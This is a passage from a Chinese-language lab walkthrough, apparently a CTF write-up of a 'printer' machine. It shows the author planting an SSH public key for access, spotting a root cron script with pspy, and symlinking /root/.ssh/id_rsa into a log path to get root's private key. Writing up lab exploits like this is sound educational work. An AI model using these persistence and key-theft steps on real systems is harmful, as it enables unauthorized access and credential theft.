+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>qwer<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>qwer<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>qwer<span class="token punctuation">)</span>
+$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">32</span>
+drwxr-xr-x <span class="token number">4</span> qwer tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">19</span>:08 <span class="token punctuation">..</span>
+lrwxrwxrwx <span class="token number">1</span> root root    <span class="token number">9</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
+-rw-r--r-- <span class="token number">1</span> qwer tao   <span class="token number">220</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_logout
+-rw-r--r-- <span class="token number">1</span> qwer tao  <span class="token number">3555</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .bashrc
+drwxr-xr-x <span class="token number">3</span> qwer tao  <span class="token number">4096</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .local
+-rw-r--r-- <span class="token number">1</span> qwer tao   <span class="token number">807</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .profile
+drwx------ <span class="token number">2</span> qwer tao  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> .ssh
+-rwx------ <span class="token number">1</span> qwer tao    <span class="token number">33</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> user.txt
+$ <span class="token function">cat</span> user.txt  
+f590b7e83e4c8cd11d06849f9c1a8f6d</code></pre>
+<p>成功拿到user flag，现在拿下私钥方便ssh连接</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">qwer@kali2:/root/Desktop/printer/lisaa$ <span class="token builtin class-name">cd</span> .ssh/
+qwer@kali2:/root/Desktop/printer/lisaa/.ssh$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">12</span>
+drwx------ <span class="token number">2</span> qwer tao <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
+drwxr-xr-x <span class="token number">4</span> qwer tao <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> qwer tao  <span class="token number">566</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> id_rsa.pub</code></pre>
+<p>没有私钥，那我自己传个公钥进去，用我的私钥连接</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">qwer@kali2:/root/Desktop/printer/lisaa/.ssh$ <span class="token builtin class-name">echo</span> <span class="token string">"**********************"</span> <span class="token operator">></span>  authorized_keys</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> id_rsa lisa@192.168.56.191
+Enter passphrase <span class="token keyword">for</span> key <span class="token string">'id_rsa'</span><span class="token builtin class-name">:</span> 
+Linux printer <span class="token number">5.10</span>.0-20-amd64 <span class="token comment">#1 SMP Debian 5.10.158-2 (2022-12-13) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
+the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
+individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+lisa@printer:~$ <span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1098</span><span class="token punctuation">(</span>lisa<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>lisa<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>lisa<span class="token punctuation">)</span>,7<span class="token punctuation">(</span>lp<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,112<span class="token punctuation">(</span>bluetooth<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span></code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传个pspy64看一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2326</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2327</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2328</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2329</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2330</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2331</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2332</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2333</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2334</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2335</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2336</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2337</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2338</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2339</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2340</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> /opt/logs <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2341</span>   <span class="token operator">|</span> /bin/bash /opt/logs/nsecure 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2342</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2343</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2344</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2345</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2346</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2347</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2348</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2349</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2350</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2351</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2352</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2353</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2354</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2355</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2356</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> 
+<span class="token number">2024</span>/06/30 <span class="token number">21</span>:37:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">2357</span>   <span class="token operator">|</span> <span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> *log* <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span> </code></pre>
+<p>发现有定时任务</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/opt/logs$ <span class="token function">cat</span> nsecure 
+<span class="token comment">#! /bin/bash</span>
+
+<span class="token assign-left variable">dst</span><span class="token operator">=</span>/opt/logs
+<span class="token assign-left variable">journal</span><span class="token operator">=</span><span class="token variable">$dst</span>/journal
+<span class="token assign-left variable">queued</span><span class="token operator">=</span>/var/spool/cups
+<span class="token assign-left variable">str</span><span class="token operator">=</span><span class="token string">"*log*"</span>
+
+<span class="token function">touch</span> <span class="token variable">$journal</span>
+<span class="token function">chmod</span> <span class="token number">700</span> <span class="token variable">$journal</span>
+<span class="token function">find</span> <span class="token parameter variable">-L</span> /var/log <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token parameter variable">-exec</span> <span class="token function">cp</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token variable">$dst</span>  <span class="token punctuation">\</span><span class="token punctuation">;</span>
+<span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">>></span> <span class="token variable">$dst</span>/journal <span class="token punctuation">\</span><span class="token punctuation">;</span>
+<span class="token function">rm</span> <span class="token variable">$dst</span>/<span class="token variable">$str</span>
+
+<span class="token keyword">if</span> <span class="token function">grep</span> <span class="token parameter variable">-q</span> <span class="token string">"fatal error !"</span> <span class="token variable">$dst</span>/journal <span class="token punctuation">;</span> <span class="token keyword">then</span>
+  <span class="token builtin class-name">umask</span> 007 <span class="token variable">$queued</span>
+  lp <span class="token parameter variable">-d</span> superPrinter <span class="token variable">$dst</span>/journal
+  <span class="token builtin class-name">umask</span> 022
+  <span class="token function">zip</span> <span class="token parameter variable">-P</span> <span class="token variable"><span class="token variable">$(</span><span class="token operator">&lt;</span>~/.lisaPass<span class="token variable">)</span></span> <span class="token parameter variable">-j</span> <span class="token variable">$journal</span>.zip <span class="token variable">$queued</span>/d*
+  <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable">$queued</span>/<span class="token punctuation">&#123;</span>d*,c*<span class="token punctuation">&#125;</span>
+  <span class="token operator">></span>/var/log/syslog
+  <span class="token operator">></span>/var/log/user.log
+  <span class="token builtin class-name">echo</span> <span class="token string">"Lisa, URGENT! Come quickly to fix the problem!"</span> <span class="token operator">|</span>wall
+<span class="token keyword">fi</span>
+
+<span class="token function">rm</span> <span class="token variable">$journal</span></code></pre>
+<p>有条指令很关键,会把opt目录下面的名字里面带有log的写到&#x2F;opt&#x2F;logs&#x2F;journal 下并且用lisa的密码压缩</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token parameter variable">-L</span> /opt <span class="token parameter variable">-type</span> f <span class="token parameter variable">-name</span> <span class="token string">"<span class="token variable">$str</span>"</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">>></span> <span class="token variable">$dst</span>/journal <span class="token punctuation">\</span><span class="token punctuation">;</span></code></pre>
+<p>先不管密码，先看看能不能搞出来，尝试软连接root的私钥</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/opt$ <span class="token function">ln</span> <span class="token parameter variable">-sv</span> /root/.ssh/id_rsa <span class="token number">123</span>.log
+<span class="token string">'123.log'</span> -<span class="token operator">></span> <span class="token string">'/root/.ssh/id_rsa'</span>
+lisa@printer:/opt/logs$ logger <span class="token string">"fatal error !"</span>
+                                                                               
+Broadcast message from root@printer <span class="token punctuation">(</span>somewhere<span class="token punctuation">)</span> <span class="token punctuation">(</span>Sun Jun <span class="token number">30</span> <span class="token number">21</span>:40:01 <span class="token number">2024</span><span class="token punctuation">)</span>:    
+                                                                               
+Lisa, URGENT<span class="token operator">!</span> Come quickly to fix the problem<span class="token operator">!</span>                                 
+                                                                               
+
+lisa@printer:/opt/logs$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">76</span>
+drwxr-xr-x <span class="token number">2</span> root root  <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 <span class="token builtin class-name">.</span>
+drwxr-xrwx <span class="token number">3</span> root root  <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:38 <span class="token punctuation">..</span>
+-rw-r--r-- <span class="token number">1</span> root root <span class="token number">61997</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 journal.zip
+-rwxr-xr-x <span class="token number">1</span> root root   <span class="token number">565</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> nsecure</code></pre>
+<p>确实拿到一个压缩包,但是捏，需要密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/tmp$ <span class="token function">unzip</span> journal.zip 
+Archive:  journal.zip
+<span class="token punctuation">[</span>journal.zip<span class="token punctuation">]</span> d00052-001 password: </code></pre>
+<p>观了一手wp，发现有两个打印机文件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">lisa@printer:/var/spool/cups$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
+total <span class="token number">40</span>
+drwxr-x---+ <span class="token number">3</span> root lp       <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 <span class="token builtin class-name">.</span>
+drwxr-xr-x  <span class="token number">6</span> root lpadmin  <span class="token number">4096</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
+-rw-r--r--  <span class="token number">1</span> root root     <span class="token number">7921</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token number">18358014</span>
+-rw-r--r--  <span class="token number">1</span> root root    <span class="token number">13699</span> Jan  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token number">21581476</span>
+-rw-------  <span class="token number">1</span> root lp       <span class="token number">1098</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 c00052
+drwxrwx--T  <span class="token number">2</span> root lp       <span class="token number">4096</span> Jun <span class="token number">30</span> <span class="token number">21</span>:40 tmp</code></pre>
+<p>把这两个数字文件放到在线网站解析一下<br><a href="https://www.coolutils.com/online/PCL-to-PDF">https://www.coolutils.com/online/PCL-to-PDF</a></p>
